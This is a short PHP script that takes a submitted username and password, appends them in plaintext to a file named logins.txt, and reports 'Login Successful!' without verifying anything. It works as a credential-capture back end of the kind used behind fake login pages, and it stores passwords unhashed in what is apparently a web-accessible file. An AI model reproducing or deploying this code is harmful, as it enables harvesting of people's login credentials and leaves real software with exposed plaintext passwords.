<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Capture the username and password from the form
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Prepare the string to store in the file
    $data = "Username: " . $username . " | Password: " . $password . "\n";

    // Write the data to a file called logins.txt
    file_put_contents('logins.txt', $data, FILE_APPEND | LOCK_EX);

    // Display a confirmation message (you could redirect instead if preferred)
    echo "<h2>Login Successful!</h2>";
    echo "<p>Your username and password have been saved.</p>";
}
?>